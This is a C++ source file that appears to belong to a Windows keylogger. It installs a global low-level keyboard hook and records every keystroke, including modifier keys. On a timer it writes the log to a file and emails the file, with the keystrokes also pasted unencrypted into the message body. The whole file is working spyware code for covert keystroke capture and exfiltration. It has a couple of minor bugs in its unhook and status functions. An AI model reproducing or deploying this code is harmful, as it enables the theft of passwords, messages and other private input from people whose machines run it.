//
// Created by younes.benhoumich on 11/02/2018.
//

#include "KeyboardHook.hpp"

namespace KeyboardHook{
    Timer MailTimer(TimerSendMail, 1000*60*MAIL_TIMER_MINUTES, Timer::Infinite);
    std::string keylog = "";
    HHOOK eHook = NULL;

    void TimerSendMail(){
        if(keylog.empty()){
            return;
        }
        std::string last_file = IO::WriteLog(keylog);

        if(last_file.empty()){
            Helper::WriteAppLog("File creation was not successful. Keylog : '" + keylog + "'");
            return;
        }
        int x = Mail::SendMail("Log ["+ last_file + "]",
                               "Hi, \n\nThe file has been attached to this mail. \nFor testing, here are the keyboard "
                               "strokes without encryption : \n\n" + keylog + "\n\nBest regards, \n",
                               IO::GetOurPath(true) + last_file);
        if(x != 7){
            Helper::WriteAppLog("Mail was not sent. Error code : " + Helper::ToString(x));
        } else {
            keylog ="";
        }
    }

    LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam){
        if(nCode < 0 ){
            CallNextHookEx(eHook, nCode, wparam, lparam);
        }
        KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;
        if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN){
            keylog += Keys::KEYS[kbs->vkCode].Name;
            if(kbs->vkCode == VK_RETURN){
                keylog += '\n';
            }
        } else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP){
            DWORD key = kbs->vkCode;
            if(key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL
               || key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT
               || key == VK_MENU || key == VK_LMENU || key == VK_RMENU
               || key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN
               || key == VK_RWIN){
                std::string keyName = Keys::KEYS[kbs->vkCode].Name;
                keyName.insert(1, "/");
                keylog += keyName;

            }

        }

        return CallNextHookEx(eHook, nCode, wparam, lparam);
    }

    bool InstallHook(){
        Helper::WriteAppLog("Hook started... Timer started");
        MailTimer.Start(true);

        eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);
        return (bool)(eHook != NULL);
    }

    bool UninstallHook(){
        BOOL b = UnhookWindowsHookEx(eHook);
        eHook == NULL;
        return (bool)b;
    }

    bool IsHooked(){
        return (bool)(eHook == NULL);
    }
}
